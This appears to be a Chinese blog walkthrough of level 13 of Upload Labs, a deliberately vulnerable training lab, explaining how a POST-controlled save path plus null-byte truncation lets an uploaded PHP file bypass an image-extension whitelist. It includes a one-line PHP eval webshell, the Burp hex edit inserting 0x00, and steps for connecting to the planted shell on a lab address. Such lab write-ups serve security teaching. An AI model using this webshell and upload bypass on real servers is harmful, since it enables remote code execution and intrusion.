---
title: Upload Labs 第13关通关详解：POST 传参与 0x00 截断的实战利用
url: https://mp.weixin.qq.com/s/pa2URvPVZKR2bZMoLRdasQ
source: Doonsec's feed
date: 2026-03-30
fetch_date: 2026-03-31T04:35:13.740450
---

# Upload Labs 第13关通关详解：POST 传参与 0x00 截断的实战利用

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/5vTt22mqAAxNNLc6Tjqgcv7yJndRJdEIhVRib7LA2SWWcvF5ZjXlBcR4qVic0YfUpCcgW8Wc7wAFzdLiaFQMdvMLKj3MFrvXVOrR3Avibrh0ZF4/0?wx_fmt=jpeg)

# Upload Labs 第13关通关详解：POST 传参与 0x00 截断的实战利用

原创

武文学网安
武文学网安

武文学网安

![]()

在小说阅读器中沉浸阅读

大家好，我是武文。

在前面的关卡中，我们已经掌握了多种文件上传绕过技巧，例如：

* 双写后缀
* 点空格绕过
* $DATA绕过

这些方法的核心都是：

👉 绕过“文件名检测”

但从第12关开始，思路发生了变化：

💡 不再专注文件名，而是转向“文件保存路径”的控制

而第13关，本质上是第12关的延续与强化。

一、第12关 → 第13关的关键变化

✔ 核心相同点

两关本质一致：

👉 用户输入参与文件路径拼接（路径可控）

✔ 关键区别

|  |  |  |  |
| --- | --- | --- | --- |
| 关卡 | 参数来源 | 参数名 | 说明 |
| 第12关 | GET（URL） | save\_path | 路径控制 |
| 第13关 | POST（Body） | save\_path | 路径控制 |

✔ 本质影响

虽然只是从 GET 变为 POST，但这会影响：

🔥 输入数据的解析方式，从而影响 %00 是否能够成功触发截断

二、第13关源码分析

核心代码如下：

```
$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES['upload_file']['tmp_name'];        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = "上传失败";        }    } else {        $msg = "只允许上传.jpg|.png|.gif类型文件！";    }}
```

✔ 关键点拆解

1️⃣ 后缀检测

```
$file_ext = substr(...)
```

👉 只检查上传文件名的后缀（不是保存路径）

2️⃣ 白名单限制

```
jpg / png / gif
```

👉 必须上传“图片后缀”3️⃣ 核心漏洞点

```
$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

👉 保存路径完全由用户控制！

三、前置知识：0x00 截断（实战版）

✔ 什么是 %00

%00 → URL编码

\x00 → NULL字节

在 C 语言中：

```
char str[] ="shell.php\0.jpg";
```

实际内容为：

```
shell.php
```

✔ 截断成立的前提

❗ 必须让服务端接收到真实的 NULL 字节（\x00）

⚠️ 关键点（很多人卡在这里）

```
%00 ≠ \x00
```

|  |  |
| --- | --- |
| 写法 | 实际效果 |
| %00 | 普通字符串 ❌ |
| \x00（真实NULL） | 触发截断 ✅ |

四、攻击思路（核心）

🎯 利用目标

构造：

```
shell.php\x00.jp
```

让：

PHP 检测：.jpg ✅

底层写入：shell.php💡 利用本质

💥 检测在 PHP 层，执行在底层 C 函数层

五、实战操作（重点步骤）

1️⃣ 准备一句话木马

```
<?php@eval($_POST['cmd']); ?>
```

2️⃣ 修改文件名

```
shell.jpg
```

👉 用于通过白名单检测

3️⃣ Burp Suite 抓包

上传文件并抓包，请求类似：

```
POST /upload-labs/Pass-13/index.php
```

4️⃣ 修改 Body（关键步骤🔥）

找到：

```
Content-Disposition: form-data; name="save_path"../upload/
```

✔ 修改为：

```
Content-Disposition: form-data; name="save_path"../upload/shell.php
```

![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAzBeES9ucCjtyBO6s5B7hyF1KSOGUbU2YibOz1sRJcxO6dvVicBTO7KMZtgOHqLYXZTH6DneGdFuEa3ug1yMyWxUzjruawWlia1Sg/640?wx_fmt=gif&from=appmsg)

shell.php后面我们需要截断操作。

❗ 正确操作方式（重点）

在 Burp Repeater 中：

切换到 Hex 模式

将：

73 68 65 6c 6c 2e 70 68 70 25

改为：

73 68 65 6c 6c 2e 70 68 70 00

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAxxeu5cZ5xXJrmWZ0bGqib2Ku7DGglrz96p89h6noHBqvzy49iacLt66NV1IxzuQDItWkiaNRnlDpz7hc8NGib1r30VrkfI73iaeJkE/640?wx_fmt=gif&from=appmsg)

👉 对应：

shell.php\x00.jpg

5️⃣ 发送请求

![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAymwEtBzQmiaF7dKWB39b4e3U1B4xzrvvG7mWK0KwYmIeUyuzzdRWe2zNESbM3pibb4sKKzPZyoyofKekCgJsiasQ7AeFIa2hpr04/640?wx_fmt=gif&from=appmsg)

6️⃣ 上传结果

打开对应的图片链接可以看到

```
http://192.168.243.128/uploadlabs/upload/shell.php�%20/7920260330013657.jpg
```

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAyiaTPPMibPd2IVzCW28aledToEicKgzMqpyHpnWRFstHwNn39iaFjP59jTBqW43CgSPicicXbticC3OEHQjX88hBttXTSchVCXs0xrzA/640?wx_fmt=gif&from=appmsg)

真正我们创建的php文件可以通过下面链接访问：

```
http://192.168.243.128/uploadlabs/upload/shell.php
```

六、漏洞验证

访问：

```
http://192.168.243.128/uploadlabs/upload/shell.php
```

页面空白（正常）

使用蚁剑连接：

密码：cmd

![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAwIbAZqm0r2EiaUfCEjjfmzFleJrqcGOdVA5dOAtgC7wicZe87wonUSsy2k01evrhCXiaP3vZT4V8CCr944vX2zo7eCAmrx33nTCA/640?wx_fmt=gif&from=appmsg)

连接成功 ✅

七、为什么可以成功？

✔ 执行流程

```
输入：shell.php\x00.jpg↓PHP检测：后缀 jpg → 合法↓底层处理：shell.php\0.jpg → shell.php↓最终：生成 shell.php
```

✔ 本质原因

💡 不同处理层对字符串的理解不一致

总结

在 Upload Labs 第13关中，漏洞的核心在于：

* 文件扩展名在 PHP 层进行检测
* 文件保存路径由用户输入控制
* 底层函数对 NULL 字节存在截断行为

通过在 POST Body 中构造：

```
shell.php\x00.jpg
```

可以在特定环境下绕过检测，最终生成 .php 文件。

同时，通过与第12关对比可以发现：

💡 漏洞本质并未改变，变化的是输入数据进入系统的方式（GET → POST）

这也说明：

🔥 漏洞利用不仅依赖代码逻辑，更依赖数据在不同处理层之间的解析差异

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

武文学网安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过